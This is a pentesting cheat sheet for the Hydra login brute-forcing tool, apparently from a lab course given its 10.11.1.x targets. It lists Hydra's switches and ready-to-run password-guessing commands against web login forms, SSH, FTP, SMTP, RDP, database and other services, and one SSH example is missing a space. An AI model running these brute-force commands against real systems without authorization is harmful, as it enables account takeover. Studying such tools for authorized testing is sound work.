hydra
https://github.com/vanhauser-thc/thc-hydra


Switches

-l login name
-P password file
-L users file
-V show every trial
-t threads
-w wait time between connection for each thread
-f exit after first password found
-s port
-u cycle usernames first


Examples

SMNP service

hydra -P password-file.txt -v 10.11.1.219 snmp

HTTP POST FORM

hydra 10.11.1.39 http-form-post "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=0&User=^USER^&Password=^PASS^:Login failed" -l root@localhost -P adobe_top100_pass.txt -t 1

HTTP GET FORM

hydra http://10.11.1.73 -l garry -P wordlist.txt http-get-form "/dvwa/index.php:username=^USER^&password=^PASS^&Login=Login:Bad password"

HTTP GET basic auth

hydra http://10.11.1.237 -l admin -P words.txt http-head /webdav/

SMTP

hydra 10.11.1.72 smtp -s 25 -V -l root -P /path/to/password/list.lst -t 10 -f

SSH

hydra -t 10 -V -f -L users-file.txt -P password-file.txtssh://<IP>

FTP

hydra -t 10 -V -f -L users-file.txt -P password-file.txt ftp://<IP>

Telnet

hydra -t 10 -V -f -L users-file.txt -P password-file.txt telnet://<IP>

MS-SQL

hydra -t 10 -V -f -L users-file.txt -P password-file.txt mssql://<IP>

MYSQL

hydra -t 10 -V -f -L users-file.txt -P password-file.txt mysql://<IP>

RDP

hydra -t 10 -V -f -L users-file.txt -P password-file.txt rdp://<IP>
